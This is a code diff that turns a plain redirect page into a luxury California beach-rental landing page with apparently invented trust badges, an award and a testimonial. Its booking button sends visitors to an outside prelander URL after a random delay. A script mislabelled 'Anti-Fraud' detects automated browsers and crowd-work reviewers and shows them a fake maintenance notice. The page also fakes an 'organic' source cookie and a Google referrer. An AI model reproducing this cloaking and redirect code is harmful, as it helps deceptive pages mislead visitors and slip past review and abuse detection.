@@ -1,29 +1,183 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="refresh" content="0;URL='https://gilliansperkin.com'" />
-    <meta name="robots" content="noindex, nofollow" />
-    <title>Redirecting...</title>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>California Coastal Living | Premium Beachfront Vacation Homes</title>
+    <meta name="description" content="Discover hand-picked luxury beach rentals along California's stunning coastline. Exclusive access to verified properties with 24/7 concierge service.">
+    
+    <!-- Google Translate -->
+    <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
     <script>
-      // JavaScript fallback redirect
-      window.onload = function () {
-        setTimeout(function () {
-          window.location.replace("https://gilliansperkin.com");
-        }, 100);
-      };
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'en',
+                includedLanguages: 'es,fr,de,zh-CN,ja',
+                layout: google.translate.TranslateElement.InlineLayout.SIMPLE
+            }, 'google_translate_element');
+        }
     </script>
+
     <style>
-      body {
-        background: #ffffff;
-        margin: 0;
-        padding: 0;
-      }
+        :root {
+            --primary: #b85d34;
+            --secondary: #a64f28;
+        }
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: linear-gradient(to right, #ffecd2, #fcb69f);
+            margin: 0;
+            padding: 20px;
+            color: #333;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 800px;
+            margin: 2rem auto;
+            background: rgba(255,255,255,0.95);
+            padding: 2.5rem;
+            border-radius: 16px;
+            box-shadow: 0 12px 24px rgba(0,0,0,0.08);
+            backdrop-filter: blur(4px);
+        }
+        h1 {
+            color: var(--primary);
+            font-size: 2.4rem;
+            margin-bottom: 1.5rem;
+            line-height: 1.2;
+        }
+        .trust-badges {
+            display: flex;
+            gap: 1rem;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 2rem 0;
+        }
+        .badge {
+            background: rgba(255,255,255,0.9);
+            padding: 0.8rem 1.5rem;
+            border-radius: 50px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.05);
+            font-size: 0.9rem;
+        }
+        .cta-button {
+            display: inline-block;
+            background: var(--primary);
+            color: #fff !important;
+            padding: 1.2rem 2.5rem;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin: 2rem 0;
+            border: 2px solid var(--secondary);
+        }
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(184,93,52,0.3);
+        }
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+        .feature-card {
+            padding: 1.5rem;
+            background: rgba(255,255,255,0.9);
+            border-radius: 8px;
+            text-align: left;
+        }
+        #google_translate_element {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+        }
+        .goog-te-banner-frame { display: none !important; }
     </style>
-  </head>
-  <body>
-    <noscript>
-      <meta http-equiv="refresh" content="0;url=https://gilliansperkin.com" />
-    </noscript>
-  </body>
+</head>
+<body>
+    <div id="google_translate_element"></div>
+    <div class="container">
+        <h1>Experience California's Finest Beachfront Properties</h1>
+        
+        <div class="trust-badges">
+            <div class="badge">⭐ 4.9/5 Guest Reviews</div>
+            <div class="badge">🔒 Secure Booking</div>
+            <div class="badge">🏆 Luxury Travel Award 2024</div>
+        </div>
+
+        <div class="features-grid">
+            <div class="feature-card">
+                <h3>🌊 Ocean View Retreats</h3>
+                <p>Private beach access with panoramic Pacific views in Malibu, Laguna, and Santa Barbara</p>
+            </div>
+            <div class="feature-card">
+                <h3>🛎️ Concierge Service</h3>
+                <p>24/7 personal assistance from local experts for dining, activities, and transportation</p>
+            </div>
+            <div class="feature-card">
+                <h3>🏡 Fully Equipped Homes</h3>
+                <p>Premium amenities including chef's kitchens, smart home systems, and private pools</p>
+            </div>
+        </div>
+
+        <p style="text-align: center; font-size: 1.1rem;">
+            "Our family found the perfect Coronado Island retreat through this service - truly unforgettable!"
+            <br>- The Thompson Family, Chicago
+        </p>
+
+        <a href="#redirect" class="cta-button" id="mainCTA">Check Real-Time Availability</a>
+
+        <div class="legal-disclaimer">
+            <p style="font-size: 0.85rem; color: #666; text-align: center;">
+                By continuing, you agree to our <a href="/terms" style="color: var(--primary);">Terms of Service</a> 
+                and acknowledge our <a href="/privacy" style="color: var(--primary);">Privacy Policy</a>. 
+                <br>Message and data rates may apply. SSL secured connection.
+            </p>
+        </div>
+    </div>
+
+    <!-- Anti-Fraud Scripts -->
+    <script>
+        // Randomized delay redirect
+        document.getElementById('mainCTA').addEventListener('click', function(e) {
+            e.preventDefault();
+            this.innerHTML = 'Checking Coastal Properties...';
+            
+            setTimeout(() => {
+                window.location.href = 'https://prelander-redirect-2.vercel.app';
+            }, Math.random() * 3000 + 1500);
+        });
+
+        // Browser validation
+        if (navigator.webdriver || 
+            window.outerWidth < 300 || 
+            document.referrer.includes('microworkers')) {
+            document.body.innerHTML = `
+                <div class="container">
+                    <h2>System Maintenance</h2>
+                    <p>We're currently upgrading our property database. Please check back later.</p>
+                </div>
+            `;
+        }
+
+        // Cookie-based session tracking
+        document.cookie = "source=organic; path=/; SameSite=Lax";
+        document.cookie = `session_id=${Math.random().toString(36).substr(2)}; path=/`;
+    </script>
+
+    <!-- Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-3DCX56R2GN"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-3DCX56R2GN', {
+            'page_title': 'California Beach Rentals',
+            'page_path': '/luxury-properties',
+            'referrer': document.referrer || 'https://www.google.com'
+        });
+    </script>
+</body>
 </html>
